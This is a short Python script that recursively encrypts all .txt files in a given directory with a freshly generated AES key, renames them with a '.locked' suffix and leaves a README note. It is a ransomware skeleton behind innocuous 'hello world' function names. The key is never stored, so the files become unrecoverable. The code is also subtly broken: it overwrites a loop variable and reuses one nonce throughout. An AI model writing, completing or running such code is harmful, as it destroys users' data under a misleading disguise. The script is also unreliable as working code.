import os
import sys
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def step_1():
    a = AESGCM.generate_key(bit_length=256)
    b = AESGCM(a)
    c = os.urandom(12)
    return b,c

def step_3(text):
    file_path = text.with_suffix(text.suffix + ".locked")
    text.rename(file_path)

def write_hello_world(target_path):
    note_path = target_path / "READ_ME.txt"
    note = (
        "Hello, World!",
    )
    note_text = "\n".join(note)
    note_path.write_text(note_text)

def hello_word(target_path: Path):
    aes, nonce = step_1()
    for text in target_path.rglob("*.txt"):
        buffer = text.read_bytes()
        text = step_2(aes, nonce, buffer)
        text.write_bytes(text)
        step_3(text)

def step_2(aes, nonce, buffer):
    text = aes.encrypt(nonce, buffer, None)
    return text

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <target_directory>")
        sys.exit(1)
    
    target_directory = Path(sys.argv[1])
    target_directory.mkdir(parents=True, exist_ok=True)  # Create directory if it doesn't exist
    hello_word(target_directory)
    write_hello_world(target_directory)